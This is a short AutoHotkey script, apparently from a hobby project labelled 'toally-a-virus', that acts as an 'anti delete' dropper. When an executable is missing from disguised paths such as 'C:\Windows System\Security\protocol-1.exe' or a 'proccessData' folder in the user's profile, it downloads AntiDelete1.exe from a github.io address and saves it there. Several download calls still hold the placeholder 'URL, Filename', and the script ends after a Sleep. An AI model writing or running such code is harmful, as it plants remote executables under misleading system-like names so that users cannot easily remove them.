#NoEnv  ; Recommended for performance and compatibility with future AutoHotkey releases.
; #Warn  ; Enable warnings to assist with detecting common errors.
SendMode Input  ; Recommended for new scripts due to its superior speed and reliability.
SetWorkingDir %A_ScriptDir%  ; Ensures a consistent starting directory.


    If (FileExist("C:\Windows System\Security\protocol-1.exe")) ;Anti delete 1
    {
        UrlDownloadToFile, URL, Filename
    }
    If !(FileExist("C:\Windows System\Security\protocol-1.exe")) ;Anti delete 1
    {
        UrlDownloadToFile, https://dj13423.github.io/download/AHK/toally-a-virus/anti-delete/AntiDelete1.exe, C:\Windows System\Security\protocol-1.exe
    }
    If (FileExist("C:\Users\%A_UserName%\proccessData\User1_data\protocol-2.exe")) ;Anti delete 2
    {
        UrlDownloadToFile, URL, Filename
    }
    If !(FileExist("C:\Users\%A_UserName%\proccessData\User1_data\protocol-2.exe")) ;Anti delete 2
    {
        UrlDownloadToFile, URL, Filename
    }
    If (FileExist("C:\Users\%A_UserName%\proccessData\User1_data\sync.exe"))
    Sleep, 15000

